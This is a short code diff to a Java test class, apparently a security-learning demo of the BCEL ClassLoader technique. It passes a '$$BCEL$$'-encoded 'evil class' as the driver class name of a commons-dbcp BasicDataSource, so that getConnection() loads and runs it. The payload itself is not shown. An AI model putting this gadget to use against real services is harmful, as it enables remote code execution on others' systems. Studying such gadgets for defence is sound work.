@@ -57,11 +57,14 @@ public class BCELTest {
     public static void main(String[] args) throws SQLException {
 //        BCEL 编码原理
         String evilClass = getEvilClass();
+        System.out.println(evilClass);
         BasicDataSource basicDataSource = new BasicDataSource();
         basicDataSource.setDriverClassLoader(new ClassLoader());
         basicDataSource.setDriverClassName("$$BCEL$$" + evilClass);
         basicDataSource.getConnection();
-        JSONObject jsonObject = new JSONObject();
-        jsonObject.toString();
+//        JSONObject jsonObject = new JSONObject();
+//        jsonObject.toString();
+
+
     }
 }
